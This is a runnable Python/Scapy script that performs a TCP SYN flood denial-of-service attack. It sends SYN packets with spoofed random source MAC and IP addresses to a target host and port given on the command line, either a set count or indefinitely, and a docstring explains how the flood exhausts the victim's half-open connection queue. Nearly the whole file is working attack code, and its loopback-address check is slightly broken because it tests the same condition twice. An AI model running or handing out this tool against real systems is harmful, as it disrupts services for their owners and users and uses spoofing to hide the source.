#!/usr/bin/env python3
import random
import argparse
import sys
import re
import ipaddress
import logging

logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import *

conf.verb = 0

"""
- SYN flood is a form of DoS attack in which attackers send many SYN requests to a victim’s 
  TCP port, but the attackers have no intention to finish the 3-way handshake procedure. 

- Attackers either use spoofed IP address or do not continue the procedure. Through this attack, 
  attackers can flood the victim’s queue that is used for half-opened connections, i.e. the 
  connections that has finished SYN, SYN-ACK, but has not yet got a final ACK back.

- When this queue is full, the victim cannot take any more connection. We can use command "netstat-na" 
  to check the usage of the queue, which is the number of half opened connection 
  associated with a listening port. The state for such connections is SYN-RECV.

- Due to the configuration of the victim, the attacking result could be different.
"""

def tcp_syn_flood(ip, mac, port, iface, n):
	"""
	Craft and send packets at Layer 2 (Data-Link) using SCAPY 
	"""

	N = 0
	try:
		if n:
			# send 'n'
			for i in range(n):
				# random source MAC address
				spoofed_mac = ':'.join([ hex(i).lstrip('0x').rjust(2,'0') for i in random.sample(range(0x0, 0xff),6)])
				# random source IP address
				spoofed_ip  = "{}.{}.{}.{}".format(*random.sample(range(1,254),4))
				# send a packet at Layer 2
				sendp(\
					Ether(dst = mac, src = spoofed_mac)/\
						IP(dst=ip, src = spoofed_ip)/\
							TCP(dport = port, sport = random.randint(1024, 65535), flags = 'S')\
							, iface = iface)
				N += 1
				print('[ %d ] packets send' % N, flush = True, end = '\r')
		else:
			# indefinitely
			while True:
				spoofed_mac = ':'.join([ hex(i).lstrip('0x').rjust(2,'0') for i in random.sample(range(0x0, 0xff),6)])
				spoofed_ip  = "{}.{}.{}.{}".format(*random.sample(range(1,254),4))
				# send a packet at Layer 2
				sendp(\
					Ether(dst = mac, src = spoofed_mac)/\
						IP(dst = ip, src = spoofed_ip)/\
							TCP(dport = port, sport = random.randint(1024, 65535), flags = 'S')\
							, iface = iface)
				N += 1
				print('[ %d ] packets send' % N, flush = True, end = '\r')
	except KeyboardInterrupt:
		print(' ' * 100 + '\r==> cancelled by user')
		print('==> [ %d ] packets send' % N)


def parse_argv(argv):
	"""
	Parse Command Line Arguments
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument('-p', '--port', type=int, dest='port', required=True, help='Destination port number')
	parser.add_argument('-a', '--host', type=str, dest='host', required=True, help='Destination Ip address')
	parser.add_argument('-n', '--pkt-count', type=int, dest='n', default=0, help='Number of TCP SYN packets to send')
	parser.add_argument('-i', '--iface', type=str, dest='iface', required=True, help='Interface card name')

	try:
		res  = parser.parse_args(argv)
		err  = False
		if not re.match("^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", res.host):
			print('==> invalid IP address')
			err = True

		if res.port < 1 or res.port > 65535:
			print('==> invalid port no. [ 1 <= port <= 65535 ]')
			err = True

		if not err:
			ip_addr = ipaddress.ip_address(res.host)
			if ip_addr.is_reserved:
				print('==> cannot use a loop-back address')
				sys.exit()
			elif ip_addr.is_reserved:
				print('==> cannot use a reserved address')
				sys.exit()

			print('==> resolving MAC address for [ %s ] ...' % res.host, end = '\r', flush = True)
			mac = getmacbyip(res.host) #get_mac_by_ip(ip_addr.exploded)
			return (ip_addr.exploded, mac, res.port, res.iface, res.n)
		else:
			sys.exit()
	except Exception as e:
		print(e)
		sys.exit()

if __name__ == '__main__':

	ip, mac, port, iface, n = parse_argv(sys.argv[1:])
	if mac:
		# print IP : MAC 
		print(" " * 100 + "\r==> resolved : %s <::> %s " % (ip, mac))
		# start syn flood
		tcp_syn_flood(ip = ip, mac = mac, port = port, iface = iface, n = n)
	else:
		# MAC address for given IP could not be resolved, exiting
		print(' ' * 100 + '\r==> could not resolve MAC address for [ %s ]' % ip, flush = True)